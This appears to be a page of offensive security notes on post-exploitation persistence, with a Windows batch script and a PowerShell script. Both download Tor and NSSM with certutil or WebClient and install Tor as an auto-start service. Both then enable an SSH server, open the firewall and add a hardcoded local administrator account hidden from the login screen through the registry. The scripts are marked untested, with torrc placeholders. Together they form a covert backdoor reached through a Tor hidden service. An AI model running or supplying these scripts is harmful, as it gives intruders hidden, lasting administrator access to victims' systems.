# Scripts

Search Tag(s): #post-exploitation #maintaining-access #persistence #network-protocols #living-off-the-land #windows

TODO: Modify and test these scripts.

## 01 - Batch Script

```batch
@echo off
set temp_directory=C:\Windows\tmp\
call TOR
timeout /T 3
call OpenSSH

:TOR
set TOR_URL=https://archive.torproject.org/tor-package-archive/torbrowser/13.5.2/tor-expert-bundle-windows-x86_64-13.5.2.tar.gz
set NSSM_URL=https://nssm.cc/release/nssm-2.24.zip
set TOR_file=%temp_directory%tor-expert-bundle-windows-x86_64-13.5.2.tar.gz
set NSSM_file=%temp_directory%nssm-2.24.zip

REM Create temporary directory
mkdir %temp_directory%

REM Download TOR and NSSM
Certutil.exe -urlcache -split -f %TOR_URL% "%TOR_file%"
Certutil.exe -urlcache -split -f %NSSM_URL% "%NSSM_file%"

REM Extract archive files
tar.exe xzf "%TOR_file%" -C %temp_directory%
powershell.exe -c "Expand-Archive $NSSM_file -DestinationPath %temp_directory%"

REM Delete archive files
del /f "%TOR_file%"
del /f "%NSSM_file%"

REM TODO: Create a torrc
echo <torrc_config_contents> > C:\Windows\tmp\tor-expert-bundle-windows-x86_64-13.5.2\tor\torrc
echo <torrc_config_contents> >> C:\Windows\tmp\tor-expert-bundle-windows-x86_64-13.5.2\tor\torrc

pushd "%temp_directory%nssm-2.24\win64\"
.\nssm.exe install tor "%temp_directory%tor-expert-bundle-windows-x86_64-13.5.2\tor\tor.exe" "-f C:\Windows\tmp\tor-expert-bundle-windows-x86_64-13.5.2\tor\torrc"

sc.exe config tor start= auto

net.exe start tor

:OpenSSH
set SSH_PORT=22
set username=sysadmin
set password=Passw0rd123!

Dism.exe /Online /Add-Capability /CapabilityName:OpenSSH.Client~~~~0.0.1.0
timeout /T 3
Dism.exe /Online /Add-Capability /CapabilityName:OpenSSH.Server~~~~0.0.1.0
timeout /T 3

REM Automatic startup service
sc.exe config sshd start= auto
sc.exe config ssh-agent start= auto

REM Start the service

net.exe start sshd
net.exe start ssh-agent

netsh.exe firewall add rule name="OpenSSH Server" dir=inbound protocol=TCP localport=%SSH_PORT% action=allow
timeout /T 2

REM Create local administrator and restart OpenSSH server
net.exe user %username% %password% /add /y
net.exe localgroup Administrators %username% /add /y
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %username% /t REG_DWORD /d 0 /f

timeout /T 1
net.exe stop sshd
net.exe start sshd
type "%temp_directory%host\hostname"
```

## 02 - PowerShell Script

```powershell
Function Install-TOR {
    $temp_directory = "C:\Windows\tmp\"
    $TOR_URL = "https://archive.torproject.org/tor-package-archive/torbrowser/13.5.2/tor-expert-bundle-windows-x86_64-13.5.2.tar.gz"
    $NSSM_URL = "https://nssm.cc/release/nssm-2.24.zip"
    $TOR_file = $($temp_directory + "tor-expert-bundle-windows-x86_64-13.5.2.tar.gz")
    $NSSM_file = $($temp_directory + "nssm-2.24.zip")
    
    mkdir $temp_directory
    
    # Download TOR and NSSM
    $webclient = New-Object System.Net.WebClient
    $webclient.DownloadFile($TOR_URL, $TOR_file)
    $webclient.DownloadFile($NSSM_URL, $NSSM_file)

    # Extract archive files
    tar.exe xzf $TOR_file -C $temp_directory
    Expand-Archive $NSSM_file -DestinationPath $temp_directory


    # Delete archive files
    Remove-Item -Force $TOR_file
    Remove-Item -Force $NSSM_file

	# TODO: Create a torrc in the powershell script
	Write-Host "<torrc_config_contents" > "C:\Windows\tmp\tor-expert-bundle-windows-x86_64-13.5.2\tor\torrc"
	Write-Host "<torrc_config_contents" >> "C:\Windows\tmp\tor-expert-bundle-windows-x86_64-13.5.2\tor\torrc"

    Set-Location $($temp_directory + "nssm-2.24\win64\")
    .\nssm.exe install tor $($temp_directory + "tor-expert-bundle-windows-x86_64-13.5.2\tor\tor.exe") "-f C:\Windows\tmp\tor-expert-bundle-windows-x86_64-13.5.2\tor\torrc"

    Set-Service -Name tor -StartupType 'Automatic'
    Start-Service tor
}

Function Install-OpenSSH {
    $temp_directory = "C:\Windows\tmp\"
    $SSH_PORT = 22
    $username = "sysadmin"
    $password = "Passw0rd123!"

    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
    sleep 3
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    sleep 3

    # Automatic startup service
    Set-Service -Name sshd -StartupType 'Automatic'
    Set-Service -Name ssh-agent -StartupType 'Automatic'

    # Start the service
    Start-Service sshd
    Start-Service ssh-agent

    # Accept Incoming Connections
    New-NetFirewallRule -Name sshd -DisplayName "OpenSSH Server" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort $SSH_PORT

    # Create local administrator and restart OpenSSH server
    sleep 2
    net.exe user $username $password /add /y
    net.exe localgroup Administrators $username /add /y
    Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name $username -Type DWord -Value 0
    
    sleep 1
    Restart-Service sshd
    Get-Content $($temp_directory + "host\hostname")
}

Install-TOR
sleep 3
Install-OpenSSH
```